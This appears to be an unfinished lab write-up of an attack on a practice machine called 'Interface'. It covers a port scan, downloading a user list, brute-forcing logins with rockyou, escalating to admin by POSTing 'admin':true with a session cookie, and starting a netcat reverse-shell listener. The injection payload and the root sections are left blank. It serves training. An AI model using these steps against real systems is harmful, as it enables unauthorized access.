# Report - Interface

- Author: Henry Post
- Target: Interface
- Target IP: 192.168.52.106
- Attacker IP: 192.168.49.52
- Date: 06/06/2026

## Executive Summary


### Recommendations


## Resources



## Recon

```sh
sudo nano /etc/hosts

nmap -sS -sV -p- interface

<<EOF
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-06 20:05 +0000
Nmap scan report for interface (192.168.52.106)
Host is up (0.00039s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Node.js Express framework
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.21 seconds
EOF
```

Port 22 and 80.

On port 80, there's a login screen.

![](Pasted%20image%2020260606150746.png)

When we inspect the POST request, it's formatted like this:

http://interface/login
payload `{"username":"xxx","password":"xxx"}` as JSON POST body.

We also notice that there's `/api/users`.

```sh
wget http://interface/api/users
mv users users.json

jq -r '.[]' users.json > users.txt
```

Now, how should we brute-force this?

A failed login to `/login` gives 401 Unauthorized.

Let's try our own custom fuzzer...

```sh
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

wget https://raw.githubusercontent.com/meltingscales/oscp/refs/heads/main/boxes/provinggrounds/Interface/brute.py

head -n 1000 /usr/share/wordlists/rockyou.txt > rockyou1000.txt
head -n 100  /usr/share/wordlists/rockyou.txt > rockyou100.txt

python brute.py --passwords rockyou100.txt
```

So apparently we get an error if we login with `wendi` with a blank password.

We stole a cred! `dev-acct:password`. Great.

We can access http://interface/api/settings. I wonder what happpens if we POST to it.

```
payload:
{"color-theme":"light","lang":"en","admin":true}

cookie:
connect.sid=s%3AuwJUhMcB3Y_rwfllS8Paq00kJ1-718sa.ItDJMDRqgJk1mKag%2FMNu7A07sNNJUkNFGyTY8e18M64
```

Now to send a POST request with cURL.

```sh
curl -s -X POST http://interface/api/settings \
  -H "Content-Type: application/json" \
  -H "Cookie: connect.sid=s%3AuwJUhMcB3Y_rwfllS8Paq00kJ1-718sa.ItDJMDRqgJk1mKag%2FMNu7A07sNNJUkNFGyTY8e18M64" \
  -d '{"color-theme":"light","lang":"en","admin":true}'
```

Sweet.

![](Pasted%20image%2020260606184950.png)

I smell command injection...

Empty string does this:

```txt
Backup created
Created backup: Created backup: /var/log/app/logfile-undefined.1780789801938.gz
```

Let's start a rev shell listener:

```sh
nc -nvlp 4444
```

And inject this payload:

```txt

; TODO ;

```



## Non-root access




## Root access

